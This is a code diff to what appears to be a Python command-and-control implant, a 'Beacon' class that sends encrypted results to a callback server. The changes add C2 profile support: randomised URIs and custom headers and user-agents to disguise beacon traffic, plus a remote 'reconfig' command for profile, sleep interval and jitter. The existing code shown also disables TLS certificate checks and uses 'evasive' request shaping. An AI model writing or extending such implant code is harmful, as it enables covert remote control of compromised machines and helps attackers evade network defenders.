@@ -487,6 +487,9 @@ class _HttpSession:
         ssl_ctx = ssl.create_default_context()
         ssl_ctx.check_hostname = False
         ssl_ctx.verify_mode = ssl.CERT_NONE
+        keylog = os.environ.get("SSLKEYLOGFILE")
+        if keylog and hasattr(ssl_ctx, "keylog_filename"):
+            ssl_ctx.keylog_filename = keylog
         handlers.append(urllib.request.HTTPSHandler(context=ssl_ctx))
 
         if self.proxies:
@@ -895,6 +898,8 @@ class Beacon:
         self._proxy = ProxyDiscovery()
         self._proxy_session: Optional[_HttpSession] = None
 
+        self._c2_profile = c2.get("c2_profile", {})
+
         self._implant_id = self._generate_id()
         self._agent_id: Optional[str] = None
         self._running = False
@@ -930,12 +935,29 @@ class Beacon:
 
     def _evasive_url(self, endpoint: str) -> str:
         base = self.callback_url.rsplit("/", 1)[0]
+        profile_block = self._c2_profile.get(
+            "http_post" if endpoint == "result" else "http_get", {})
+        uris = profile_block.get("uris", [])
+        if uris:
+            uri = random.choice(uris).lstrip("/")
+            return f"{base}/{uri}"
         suffix = random.choice(_URL_SUFFIXES)
         ts = int(time.time() * 1000)
         qp = f"?_t={ts}&sid={random.randint(10000, 99999)}"
         return f"{base}/{endpoint}{suffix}{qp}"
 
     def _evasive_headers(self) -> dict:
+        profile_block = self._c2_profile.get("http_get", {})
+        if profile_block.get("headers") or self._c2_profile.get("useragent"):
+            headers = {}
+            ua = self._c2_profile.get("useragent", "")
+            headers["User-Agent"] = ua if ua else random.choice(_USER_AGENTS)
+            headers["Content-Type"] = "application/json"
+            for name, value in profile_block.get("headers", {}).items():
+                headers[name] = value
+            for name, value in profile_block.get("params", {}).items():
+                pass
+            return headers
         headers = {
             "User-Agent": random.choice(_USER_AGENTS),
             "Accept": "application/json, text/plain, */*",
@@ -949,6 +971,18 @@ class Beacon:
         for k in extra_keys:
             headers[k] = random.choice(_EXTRA_HEADERS[k])
         return headers
+
+    def _post_headers(self) -> dict:
+        profile_block = self._c2_profile.get("http_post", {})
+        if profile_block.get("headers") or self._c2_profile.get("useragent"):
+            headers = {}
+            ua = self._c2_profile.get("useragent", "")
+            headers["User-Agent"] = ua if ua else random.choice(_USER_AGENTS)
+            headers["Content-Type"] = "application/json"
+            for name, value in profile_block.get("headers", {}).items():
+                headers[name] = value
+            return headers
+        return self._evasive_headers()
 
     def _wrap_payload(self, data: dict) -> dict:
         encrypted = self._encrypt(data)
@@ -992,6 +1026,31 @@ class Beacon:
             info["proxy_active"] = self._proxy._active_proxy["url"]
         elif self._proxy_session and self._proxy_session.proxies:
             info["proxy_active"] = next(iter(self._proxy_session.proxies.values()), "none")
+
+        if self._c2_profile:
+            p = self._c2_profile
+            prof: dict = {"active": True}
+            if p.get("useragent"):
+                prof["useragent"] = p["useragent"]
+            get_b = p.get("http_get", {})
+            post_b = p.get("http_post", {})
+            if get_b.get("uris"):
+                prof["get_uris"] = get_b["uris"]
+            if post_b.get("uris"):
+                prof["post_uris"] = post_b["uris"]
+            if get_b.get("headers"):
+                prof["get_headers"] = list(get_b["headers"].keys())
+            if post_b.get("headers"):
+                prof["post_headers"] = list(post_b["headers"].keys())
+            if get_b.get("metadata"):
+                prof["metadata_config"] = get_b["metadata"]
+            if post_b.get("id"):
+                prof["id_config"] = post_b["id"]
+            prof["jitter"] = int(self.jitter * 100)
+            prof["interval"] = self.interval
+            info["c2_profile"] = prof
+        else:
+            info["c2_profile"] = {"active": False}
         return info
 
     @staticmethod
@@ -1040,11 +1099,12 @@ class Beacon:
     def _https_post(self, endpoint: str, data: dict) -> Optional[dict]:
         """POST encrypted payload via proxy-aware session; returns decrypted response or None."""
         session = self._proxy_session or _HttpSession()
+        hdrs = self._post_headers() if endpoint == "result" else self._evasive_headers()
         try:
             resp = session.post(
                 self._evasive_url(endpoint),
                 json_data=self._wrap_payload(data),
-                headers=self._evasive_headers(),
+                headers=hdrs,
                 timeout=30,
             )
             if resp.status_code == 200:
@@ -1061,7 +1121,7 @@ class Beacon:
                 resp = direct.post(
                     self._evasive_url(endpoint),
                     json_data=self._wrap_payload(data),
-                    headers=self._evasive_headers(),
+                    headers=hdrs,
                     timeout=30,
                 )
                 if resp.status_code == 200:
@@ -2197,7 +2257,32 @@ class Beacon:
         result_data = None
 
         try:
-            if cmd == "sleep":
+            if cmd == "reconfig":
+                try:
+                    reconf = json.loads(data) if isinstance(data, str) else data
+                    parts = []
+                    if "c2_profile" in reconf:
+                        self._c2_profile = reconf["c2_profile"]
+                        parts.append("C2 profile updated")
+                        if self._c2_profile.get("useragent"):
+                            parts.append(f"UA: {self._c2_profile['useragent'][:60]}")
+                        n_get = len(self._c2_profile.get("http_get", {}).get("uris", []))
+                        n_post = len(self._c2_profile.get("http_post", {}).get("uris", []))
+                        if n_get or n_post:
+                            parts.append(f"URIs: {n_get} GET, {n_post} POST")
+                        logger.info("C2 profile reconfigured dynamically")
+                    if reconf.get("sleeptime"):
+                        self.interval = max(1, int(reconf["sleeptime"]) / 1000)
+                        parts.append(f"interval={self.interval}s")
+                    if reconf.get("jitter"):
+                        self.jitter = max(0, min(100, int(reconf["jitter"]))) / 100.0
+                        parts.append(f"jitter={int(self.jitter*100)}%")
+                    output = " — ".join(parts) if parts else "No changes applied"
+                except Exception as e:
+                    status = "error"
+                    output = f"Reconfig failed: {e}"
+
+            elif cmd == "sleep":
                 parts = str(args).split()
                 self.interval = max(1, float(parts[0]))
                 if len(parts) > 1:
